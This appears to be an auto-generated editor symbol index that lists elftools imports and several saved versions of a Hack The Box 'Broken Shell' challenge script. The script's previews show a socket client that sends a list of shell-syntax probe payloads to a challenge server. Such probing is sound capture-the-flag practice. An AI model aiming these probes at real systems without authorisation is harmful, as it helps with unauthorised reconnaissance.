        "label": "DW_LNS_set_file",
        "importPath": "elftools.dwarf.constants",
        "description": "elftools.dwarf.constants",
        "isExtraImport": true,
        "detail": "elftools.dwarf.constants",
        "documentation": {}
    },
    {
        "label": "DW_LNE_define_file",
        "importPath": "elftools.dwarf.constants",
        "description": "elftools.dwarf.constants",
        "isExtraImport": true,
        "detail": "elftools.dwarf.constants",
        "documentation": {}
    },
    {
        "label": "LocationParser",
        "importPath": "elftools.dwarf.locationlists",
        "description": "elftools.dwarf.locationlists",
        "isExtraImport": true,
        "detail": "elftools.dwarf.locationlists",
        "documentation": {}
    },
    {
        "label": "LocationEntry",
        "importPath": "elftools.dwarf.locationlists",
        "description": "elftools.dwarf.locationlists",
        "isExtraImport": true,
        "detail": "elftools.dwarf.locationlists",
        "documentation": {}
    },
    {
        "label": "LocationViewPair",
        "importPath": "elftools.dwarf.locationlists",
        "description": "elftools.dwarf.locationlists",
        "isExtraImport": true,
        "detail": "elftools.dwarf.locationlists",
        "documentation": {}
    },
    {
        "label": "BaseAddressEntry",
        "importPath": "elftools.dwarf.locationlists",
        "description": "elftools.dwarf.locationlists",
        "isExtraImport": true,
        "detail": "elftools.dwarf.locationlists",
        "documentation": {}
    },
    {
        "label": "LocationListsPair",
        "importPath": "elftools.dwarf.locationlists",
        "description": "elftools.dwarf.locationlists",
        "isExtraImport": true,
        "detail": "elftools.dwarf.locationlists",
        "documentation": {}
    },
    {
        "label": "RangeEntry",
        "importPath": "elftools.dwarf.ranges",
        "description": "elftools.dwarf.ranges",
        "isExtraImport": true,
        "detail": "elftools.dwarf.ranges",
        "documentation": {}
    },
    {
        "label": "BaseAddressEntry",
        "importPath": "elftools.dwarf.ranges",
        "description": "elftools.dwarf.ranges",
        "isExtraImport": true,
        "detail": "elftools.dwarf.ranges",
        "documentation": {}
    },
    {
        "label": "RangeListsPair",
        "importPath": "elftools.dwarf.ranges",
        "description": "elftools.dwarf.ranges",
        "isExtraImport": true,
        "detail": "elftools.dwarf.ranges",
        "documentation": {}
    },
    {
        "label": "CIE",
        "importPath": "elftools.dwarf.callframe",
        "description": "elftools.dwarf.callframe",
        "isExtraImport": true,
        "detail": "elftools.dwarf.callframe",
        "documentation": {}
    },
    {
        "label": "FDE",
        "importPath": "elftools.dwarf.callframe",
        "description": "elftools.dwarf.callframe",
        "isExtraImport": true,
        "detail": "elftools.dwarf.callframe",
        "documentation": {}
    },
    {
        "label": "ZERO",
        "importPath": "elftools.dwarf.callframe",
        "description": "elftools.dwarf.callframe",
        "isExtraImport": true,
        "detail": "elftools.dwarf.callframe",
        "documentation": {}
    },
    {
        "label": "CorruptEHABIEntry",
        "importPath": "elftools.ehabi.ehabiinfo",
        "description": "elftools.ehabi.ehabiinfo",
        "isExtraImport": true,
        "detail": "elftools.ehabi.ehabiinfo",
        "documentation": {}
    },
    {
        "label": "CannotUnwindEHABIEntry",
        "importPath": "elftools.ehabi.ehabiinfo",
        "description": "elftools.ehabi.ehabiinfo",
        "isExtraImport": true,
        "detail": "elftools.ehabi.ehabiinfo",
        "documentation": {}
    },
    {
        "label": "GenericEHABIEntry",
        "importPath": "elftools.ehabi.ehabiinfo",
        "description": "elftools.ehabi.ehabiinfo",
        "isExtraImport": true,
        "detail": "elftools.ehabi.ehabiinfo",
        "documentation": {}
    },
    {
        "label": "ENUM_DW_UT",
        "importPath": "elftools.dwarf.enums",
        "description": "elftools.dwarf.enums",
        "isExtraImport": true,
        "detail": "elftools.dwarf.enums",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "peekOfCode": "HOST = \"94.237.120.71\"\nPORT = 34065\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "peekOfCode": "PORT = 34065\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516190509",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "peekOfCode": "HOST = \"94.237.120.71\"\nPORT = 34065\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "peekOfCode": "PORT = 34065\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516192425",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "peekOfCode": "HOST = \"94.237.120.71\"\nPORT = 34065\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "peekOfCode": "PORT = 34065\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516193822",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "peekOfCode": "HOST = \"94.237.120.71\"\nPORT = 34065\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "peekOfCode": "PORT = 34065\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516194049",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "peekOfCode": "HOST = \"94.237.57.57\"\nPORT = 51289\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "peekOfCode": "PORT = 51289\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516194629",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "peekOfCode": "HOST = \"94.237.57.57\"\nPORT = 51289\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "peekOfCode": "PORT = 51289\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "description": ".history.HTB-Broken-Shell.Script-1_20250516222657",
